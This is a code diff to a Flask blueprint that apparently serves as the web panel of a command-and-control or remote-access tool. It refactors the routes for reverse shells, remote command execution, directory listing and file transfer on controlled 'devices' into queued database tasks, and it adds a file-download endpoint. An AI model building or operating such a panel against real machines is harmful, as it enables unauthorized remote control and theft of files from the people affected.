@@ -1,6 +1,7 @@
+import os
 from Commander import Commander
 from Database import DeviceModel, TaskModel, Session
-from flask import Blueprint, jsonify, render_template, request, send_file
+from flask import Blueprint, jsonify, render_template, request, send_from_directory
 from Utils.web import authorized, generate_response
 
 
@@ -19,6 +20,14 @@ def devices_bp(commander: Commander):
             id=request.args.get("open")).first()
         return render_template("devices.html", devices=devices, opened_device=opened_device)
 
+    @devices_bp.route("/downloads/<string:file>", methods=["GET"])
+    @authorized
+    def get_downloads(file: str):
+        if file is None:
+            return generate_response("error", "File name is missing.", "devices", 400)
+        return send_from_directory(os.path.join(os.getcwd(), "Data/Downloads/"), file, as_attachment=True)
+
+
     @devices_bp.route("/reverse_shell", methods=["POST"])
     @authorized
     def post_reverse_shell():
@@ -29,8 +38,9 @@ def devices_bp(commander: Commander):
         binary = request.form.get("binary")
 
         try:
-            task = commander.get_active_handler(
-                device_id).reverse_shell(address, port, binary)
+            task = TaskModel.reverse_shell(device_id, address, port, binary)
+            Session.add(task)
+            Session.commit()
         except Exception as e:
             return generate_response("error", str(e), "devices", 500)
         else:
@@ -47,7 +57,9 @@ def devices_bp(commander: Commander):
         cmd = request.form.get("cmd")
 
         try:
-            task = commander.get_active_handler(device_id).rce(cmd)
+            task = TaskModel.remote_command_execution(device_id, cmd)
+            Session.add(task)
+            Session.commit()
         except Exception as e:
             return generate_response("error", str(e), "devices", 500)
         else:
@@ -62,11 +74,10 @@ def devices_bp(commander: Commander):
         use_json = request.args.get("json", "").lower() == "true"
         device_id = request.args.get("id", "")
 
-        if not device_id .isdigit():
-            return generate_response("error", "Invalid ID.", "devices", 400)
-        device_id = int(device_id)
         try:
-            task = commander.get_active_handler(device_id).infos()
+            task = TaskModel.get_infos(device_id)
+            Session.add(task)
+            Session.commit()
         except Exception as e:
             return generate_response("error", str(e), "devices", 500)
         else:
@@ -83,8 +94,9 @@ def devices_bp(commander: Commander):
         dir = request.args.get("dir")
 
         try:
-            task = commander.get_active_handler(
-                device_id).get_directory_contents(dir)
+            task = TaskModel.list_directory_contents(device_id, dir)
+            Session.add(task)
+            Session.commit()
         except Exception as e:
             return jsonify({"status": "error", "message": str(e)})
         else:
@@ -98,16 +110,17 @@ def devices_bp(commander: Commander):
     def post_upload():
         use_json = request.args.get("json", "").lower() == "true"
         device_id = request.args.get("id")
-        remote_path = request.args.get("path")
+        target_path = request.args.get("path")
 
         # check if file is in request
         if not "file" in request.files:
             return generate_response("error", "The as_file parameter is true, but no file was given.", "devices", 400)
-        if remote_path is None:
+        if target_path is None:
             return generate_response("error", "Upload path is missing.", "devices", 400)
         try:
-            task = commander.get_active_handler(
-                device_id).file_upload(request.files.get('file'), remote_path)
+            task = TaskModel.upload(device_id, request.files.get('file'), target_path)
+            Session.add(task)
+            Session.commit()
         except Exception as e:
             return generate_response("error", str(e), "devices", 500)
         else:
@@ -121,13 +134,14 @@ def devices_bp(commander: Commander):
     def get_download():
         use_json = request.args.get("json", "").lower() == "true"
         device_id = request.args.get("id", "")
-        remote_path = request.args.get("path")
+        target_path = request.args.get("path")
 
-        if remote_path is None:
+        if target_path is None:
             return generate_response("error", "File path is missing.", "devices", 400)
         try:
-            task = commander.get_active_handler(
-                device_id).file_download(remote_path)
+            task = TaskModel.download(device_id, target_path)
+            Session.add(task)
+            Session.commit()
         except Exception as e:
             return generate_response("error", str(e), "/devices", 500)
         else:
